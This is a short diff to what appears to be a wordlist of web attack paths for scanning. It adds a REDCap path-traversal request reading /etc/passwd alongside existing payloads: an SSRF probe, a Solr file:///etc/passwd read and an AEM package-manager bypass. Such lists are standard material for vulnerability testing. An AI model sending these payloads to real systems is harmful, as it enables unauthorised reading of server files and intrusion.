@@ -5269,3 +5269,4 @@ plugins/servlet/oauth/users/icon-uri?consumerUri=https://ipinfo.io/json
 secure/popups/UserPickerBrowser.jspa
 content/..;/crx/packmgr/teams.jsp;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0aa.css?_dc=1615863080856&_charset_=utf-8&includeVersions=true
 solr//debug/dump?stream.url=file:///etc/passwd
+api/?type=module&prefix=redcap_landing_page&page=getAsset&file=../../../../../../../etc/passwd&ts=1589308082&NOAUTH
